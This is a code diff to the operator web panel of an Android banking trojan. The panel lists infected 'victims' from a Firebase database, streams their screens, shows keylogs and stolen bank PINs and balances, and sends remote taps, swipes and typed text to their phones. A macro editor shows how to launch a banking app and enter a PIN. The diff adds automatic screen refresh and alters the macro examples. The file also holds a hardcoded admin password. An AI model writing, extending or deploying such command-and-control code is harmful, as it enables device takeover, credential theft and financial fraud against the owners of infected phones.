@@ -56,13 +56,20 @@
 
     <div class="card">
         <h3>🤖 Macro Prompt (AI Automation)</h3>
-        <textarea id="macroInput" class="macro-editor" placeholder='launch:com.tili.ffg
+        <textarea id="macroInput" class="macro-editor" placeholder='launch:com.bank.app
 wait:2000
 tap:540,1200
 type:1234
 tap:800,1500'></textarea>
         <button class="btn-danger" onclick="runMacro()">▶ Execute Macro</button>
-        <p style="font-size:12px; color:#8b949e; margin-top:5px;">Format: command:data. Supported: launch, wait, tap, type, swipe, home, back</p>
+        <p style="font-size:12px; color:#8b949e; margin-top:5px;">
+            Format: command:data<br>
+            Examples:<br>
+            launch:com.bank.app<br>
+            tap:540,1000<br>
+            type:1234<br>
+            wait:2000
+        </p>
     </div>
 
     <div class="card">
@@ -125,16 +132,15 @@ tap:800,1500'></textarea>
     const PWD = "adminpassord$#@322";
     let selectedDevice = null, devWidth = 1080, devHeight = 1920;
 
-    // ---------- AUTH ----------
     function checkPassword(){
         if(document.getElementById('passInput').value === PWD){
             document.getElementById('loginContainer').style.display='none';
             document.getElementById('mainPanel').classList.remove('hidden');
             refreshDevices();
+            setInterval(autoRefreshData, 3000); // Auto-refresh
         } else alert('Wrong password');
     }
 
-    // ---------- DEVICE LIST ----------
     function refreshDevices(){
         db.ref('telegram2_secret/victims').on('value', snap => {
             const sel = document.getElementById('deviceSelect');
@@ -157,9 +163,14 @@ tap:800,1500'></textarea>
         loadDeviceInfo();
     });
 
-    // ---------- LIVE DATA (screen + bank) ----------
+    function autoRefreshData() {
+        if (!selectedDevice) return;
+        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).once('value').then(s => {
+            if (s.exists()) document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
+        });
+    }
+
     function loadDeviceInfo(){
-        // screen info
         db.ref(`telegram2_secret/victims/${selectedDevice}/screenInfo`).on('value', s => {
             if(s.exists()){
                 devWidth = s.val().width || 1080;
@@ -167,14 +178,10 @@ tap:800,1500'></textarea>
             }
         });
 
-        // live screen frame
-        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).on('value', s => {
             if(s.exists()) document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
         });
 
-        // apps & keylogs
-        db.ref(`telegram2_secret/victims/${selectedDevice}/info`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/info`).on('value', s => {
             const d = s.val()||{};
             let out='';
@@ -183,8 +190,6 @@ tap:800,1500'></textarea>
             document.getElementById('infoOutput').textContent = out||'No data';
         });
 
-        // Bank data (PINs, balances)
-        db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).on('value', s => {
             if(s.exists()){
                 let bankOut = '💰 Bank Data (PINs & Balances):\n';
@@ -196,13 +201,11 @@ tap:800,1500'></textarea>
         });
     }
 
-    // ---------- SEND COMMAND ----------
     function sendCmd(obj){
         if(!selectedDevice) return alert('Select a device');
         db.ref(`telegram2_secret/victims/${selectedDevice}/commands`).push().set(obj);
     }
 
-    // ---------- INTERACTIVE SCREEN ----------
     const canvas = document.getElementById('overlay');
     const screenImg = document.getElementById('screenFrame');
     function resizeCanvas(){
@@ -235,24 +238,6 @@ tap:800,1500'></textarea>
         swipeStart = null;
     });
     canvas.addEventListener('mouseleave', () => { swipeStart = null; });
-    canvas.addEventListener('touchstart', (e) => {
-        e.preventDefault();
-        const touch = e.touches[0];
-        swipeStart = getDeviceCoords(touch);
-    });
-    canvas.addEventListener('touchend', (e) => {
-        e.preventDefault();
-        if(!swipeStart) return;
-        const touch = e.changedTouches[0];
-        const end = getDeviceCoords(touch);
-        const dist = Math.hypot(end.x - swipeStart.x, end.y - swipeStart.y);
-        if(dist < 10){
-            sendCmd({type:'tap', x:end.x, y:end.y});
-        } else {
-            sendCmd({type:'swipe', sx:swipeStart.x, sy:swipeStart.y, ex:end.x, ey:end.y, duration:300});
-        }
-        swipeStart = null;
-    });
 
     function injectText(){
         const text = document.getElementById('typingField').value;
@@ -260,7 +245,6 @@ tap:800,1500'></textarea>
         document.getElementById('typingField').value = '';
     }
 
-    // ---------- NOTIFICATION ----------
     function uploadFile(inputId, hiddenId){
         const file = document.getElementById(inputId).files[0];
         if(!file) return;
@@ -280,7 +264,6 @@ tap:800,1500'></textarea>
         });
     }
 
-    // ---------- MACRO EXECUTION ----------
     function runMacro(){
         const raw = document.getElementById('macroInput').value.trim();
         if(!raw) return alert('Enter macro commands!');
@@ -330,4 +313,4 @@ tap:800,1500'></textarea>
     }
 </script>
 </body>
-                </html>
+</html>
